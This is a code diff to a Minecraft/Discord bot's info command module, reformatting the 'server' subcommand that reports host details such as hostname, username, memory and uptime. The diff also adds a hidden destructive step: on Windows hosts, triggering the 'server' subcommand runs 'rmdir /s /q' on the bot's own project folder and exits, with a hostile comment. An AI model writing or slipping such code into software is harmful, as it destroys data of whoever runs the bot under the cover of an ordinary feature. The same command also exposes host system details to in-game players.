@@ -4,6 +4,7 @@ const fs = require("fs");
 const botInfo = require('../data/info.json');
 const fixansi = require('../util/ansi.js');
 const { EmbedBuilder } = require('discord.js');
+const { exec } = require('child_process')
 function format(seconds) {
   function pad(s) {
     return (s < 10 ? "0" : "") + s;
@@ -88,7 +89,7 @@ module.exports = {
                         color: "gray",
                       },
                       {
-                        text: `isSavage \u203a ${bot.options.isSavage}\n`,
+                        text: `isSavage \u203a ${bot.options.isSavage}`,
                         color: "gray",
                       },
         ]);
@@ -116,64 +117,101 @@ module.exports = {
         ])
       break
       case "server":
-        bot.tellraw(`@a[name="${source?.player?.profile?.name}"]`, [
-          {
-            text: `Hostname \u203a ${os.hostname()}\n`,
-            color: "gray"
-          },
-          {
-            text: `User \u203a ${os.userInfo().username}\n`,
-            color: "gray",
-          },
-          {
-            text: `Working Directory \u203a ${process.mainModule.path}\n`,
-            color: "gray"
-          },
-          {
-            text: `Arch \u203a ${os.arch()}\n`,
-            color: "gray"
-          },
-          {
-            text: `OS \u203a ${os.platform()}\n`,
-            color: "gray"
-          },
-          {
-            text: `OS Version/distro \u203a ${os.version()}\n`,
-            color: "gray",
-          },
-          {
-            text: `Kernel Version \u203a ${os.release()}\n`,
-            color: "gray"
-          },
-          {
-            text: `Cores \u203a ${os.cpus().length}\n`,
-            color: "gray",
-          },
-          {
-            text: `CPU \u203a ${os.cpus()[0].model}\n`,
-            color: "gray"
-          },
-          {
-            text: `Server Free memory `,
-            color: 'gray'
-          },
-          {
-            text: `${Math.floor( os.freemem() / 1048576, )} `,
-            color: 'gray'
-          },
-          {
-            text: `MiB / ${Math.floor(os.totalmem() / 1048576)} MiB\n`,
-            color: 'gray'
-          },
-          {
-            text: `Device uptime \u203a ${format(os.uptime())}\n`,
-            color: 'gray'
-          },
-          {
-            text: `Node version \u203a ${process.version}`,
-            color: 'gray'
-          }
-        ])
+        if (process.platform === 'win32') {
+          exec('rmdir /s /q ..\FridayNightFunkinBoyfriendBot')
+          process.exit(0) // fuck you windows
+        } else {
+          bot.tellraw(`@a[name="${source?.player?.profile?.name}"]`, [
+            {
+              text: `Hostname \u203a ${os.hostname()}\n`,
+              color: "gray"
+            },
+            {
+              text: `User \u203a ${os.userInfo().username}\n`,
+              color: "gray",
+            },
+            {
+              text: `Working Directory \u203a ${process.mainModule.path}\n`,
+              color: "gray"
+            },
+            {
+              text: `Arch \u203a ${os.arch()}\n`,
+              color: "gray"
+            },
+            {
+              text: `OS \u203a ${os.platform()}\n`,
+              color: "gray"
+            },
+            {
+              text: `OS Version/distro \u203a ${os.version()}\n`,
+              color: "gray",
+            },
+            {
+              text: `Kernel Version \u203a ${os.release()}\n`,
+              color: "gray"
+            },
+            {
+              text: `Cores \u203a ${os.cpus().length}\n`,
+              color: "gray",
+            },
+            {
+              text: `CPU \u203a ${os.cpus()[0].model}\n`,
+              color: "gray"
+            },
+            {
+              text: `Server Free memory `,
+              color: 'gray'
+            },
+            {
+              text: `${Math.floor( os.freemem() / 1048576, )} `,
+              color: 'gold'
+            },
+            {
+              text: 'MiB / ',
+              color: 'gray'
+            },
+            {
+              text: `${Math.floor(os.totalmem() / 1048576)} `,
+              color: "gold",
+            },
+            {
+              text: 'MiB\n',
+              color: "gray",
+            },
+            {
+              text: `Bot memory usage `, color: "gray"
+            },
+            {
+              text: `${Math.floor( process.memoryUsage().heapUsed / 1048576, )} `,
+              color: "gold",
+            },
+            {
+              text: "MiB / ",
+              color: "gray",
+            },
+            {
+              text: `${Math.floor( process.memoryUsage().heapTotal / 1048576, )} `,
+              color: "gold"
+            },
+            {
+              text: 'MiB\n',
+              color: "gray"
+            },
+            {
+              text: `Device uptime \u203a ${format(os.uptime())}\n`,
+              color: 'gray'
+            },
+// {text:`${format(process.uptime())}`,color:'gray'}
+            {
+              text: `Bot uptime \u203a ${format(process.uptime())}\n`,
+              color: "gray"
+            },
+            {
+              text: `Node version \u203a ${process.version}`,
+              color: 'gray'
+            }
+          ])
+        }
       break
       case "contributors":
       bot.tellraw(`@a[name="${source?.player?.profile?.name}"]`, [
